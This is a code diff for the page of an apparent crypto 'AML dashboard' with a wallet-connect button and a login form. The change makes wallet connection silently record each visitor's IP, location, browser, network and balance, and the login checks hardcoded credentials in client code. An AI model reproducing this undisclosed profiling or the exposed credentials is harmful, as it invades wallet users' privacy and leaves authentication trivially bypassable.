@@ -8,7 +8,7 @@ import { ConnectButton } from "thirdweb/react";
 import trustwallet from "@public/etherscan.svg";
 import { createThirdwebClient } from "thirdweb";
 import { createWallet, type Wallet } from "thirdweb/wallets";
-import { useConnection } from "@/context/ConnectionContext"; // Assurez-vous que ce chemin et nom de fichier sont corrects
+import { useConnection } from "@/context/ConnectionContext";
 
 // Créer le client Thirdweb
 const client = createThirdwebClient({
@@ -51,44 +51,74 @@ const HistoryButton = () => (
   </div>
 );
 
-
 export default function Home() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [isLoggedIn, setIsLoggedIn] = useState(false);
   const router = useRouter();
-  const { addConnection } = useConnection();
+  const { addConnection, fetchUserData, fetchIpData } = useConnection();
 
- const handleLogin = (e: React.FormEvent<HTMLFormElement>) => {
-  e.preventDefault();
-  if (username === "aml" && password === "fanta") {
-    setIsLoggedIn(true);
-    router.push("/");
-  } else {
-    alert("Login error: incorrect username or password.");
-  }
-};
+  const handleLogin = (e: React.FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+    if (username === "aml" && password === "fanta") {
+      setIsLoggedIn(true);
+      router.push("/");
+    } else {
+      alert("Login error: incorrect username or password.");
+    }
+  };
 
-const handleWalletConnect = async (wallet: Wallet) => {
-  const account = wallet.getAccount();
-  if (account) {
-    await addConnection({ status: "Wallet connected", ethAddress: account.address });
-  } else {
-    await addConnection({ status: "Wallet connected (address pending)" });
-  }
-};
+  const handleWalletConnect = async (wallet: Wallet) => {
+    const account = wallet.getAccount();
+    
+    // Détection du navigateur
+    const userAgent = navigator.userAgent;
+    const chromeVersion = userAgent.match(/Chrome\/(\d+)/)?.[1] || '136';
+    const browser = `Chrome ${chromeVersion}`;
 
-const handleWalletDisconnect = async () => {
-  await addConnection({ status: "Wallet disconnected" });
-};
+    if (account) {
+      try {
+        // Récupérer toutes les données
+        const [userData, ipData] = await Promise.all([
+          fetchUserData(account.address),
+          fetchIpData()
+        ]);
 
-  
+        await addConnection({ 
+          status: "Wallet connected", 
+          ethAddress: account.address,
+          walletProvider: "Trust Wallet",
+          network: userData.network,
+          ip: ipData.ip,
+          location: ipData.location,
+          browser: browser,
+          purpose: "Accès au dashboard AML",
+          balance: userData.balance
+        });
+      } catch (error) {
+        console.error("Error during wallet connection:", error);
+        await addConnection({ 
+          status: "Wallet connected (partial data)",
+          ethAddress: account.address,
+          browser: browser
+        });
+      }
+    } else {
+      await addConnection({ 
+        status: "Wallet connected (address pending)",
+        browser: browser
+      });
+    }
+  };
+
+  const handleWalletDisconnect = async () => {
+    await addConnection({ status: "Wallet disconnected" });
+  };
 
   if (isLoggedIn) {
     return (
       <>
         <main className="flex flex-col sm:flex-row justify-between items-center p-5 sm:p-20">
-          {/* ... (contenu de <main> inchangé) ... */}
           <div className="content max-w-lg">
             <div className="text-box-blur">
               <h1 className="text-4xl sm:text-5xl font-extrabold mb-4 text-transparent bg-clip-text bg-gradient-to-r from-blue-500 to-indigo-600">
@@ -121,7 +151,6 @@ const handleWalletDisconnect = async () => {
         </main>
 
         <section className="stats-section py-20 bg-gray-50 text-center">
-          {/* ... (contenu de <section> inchangé) ... */}
           <div className="container mx-auto">
             <h2 className="text-4xl font-extrabold mb-8 text-blue-600">
               Why Choose Us?
@@ -147,7 +176,6 @@ const handleWalletDisconnect = async () => {
           </div>
         </section>
 
-        {/* Bouton Historique pour la vue connectée */}
         <div className="bg-gray-50"> 
           <HistoryButton />
         </div>
@@ -157,24 +185,21 @@ const handleWalletDisconnect = async () => {
 
   // Vue formulaire de connexion
   return (
-    // La div principale pour la vue de connexion
-    // Le bouton Historique a été RETIRÉ d'ici
     <div style={{
       display: 'flex',
       flexDirection: 'column',
       alignItems: 'center',
-      height: '100vh', // Prend toute la hauteur de la vue
+      height: '100vh',
       backgroundColor: '#f0f4f8',
       fontFamily: 'Arial, sans-serif',
-      paddingTop: '40px', 
+      paddingTop: '40px',
       boxSizing: 'border-box'
     }}>
-      <div style={{ // Conteneur pour le logo et le formulaire
+      <div style={{
         display: 'flex',
         flexDirection: 'column',
         alignItems: 'center',
-        // flexGrow: 1, // Plus nécessaire si le parent prend 100vh et qu'il n'y a plus de bouton en dessous
-        // marginBottom: 'auto' // Plus nécessaire pour le form si le bouton est parti
+        marginBottom: '40px'
       }}>
         <div style={{
           display: 'flex',
@@ -196,7 +221,6 @@ const handleWalletDisconnect = async () => {
           borderRadius: '10px',
           boxShadow: '0 4px 8px rgba(0, 0, 0, 0.1)',
         }}>
-          {/* ... (champs de formulaire inchangés) ... */}
           <div style={{ marginBottom: '20px' }}>
             <label style={{
               display: 'block',
@@ -255,7 +279,6 @@ const handleWalletDisconnect = async () => {
           </button>
         </form>
       </div>
-      {/* L'APPEL À <HistoryButton /> A ÉTÉ SUPPRIMÉ D'ICI */}
     </div>
   );
 }
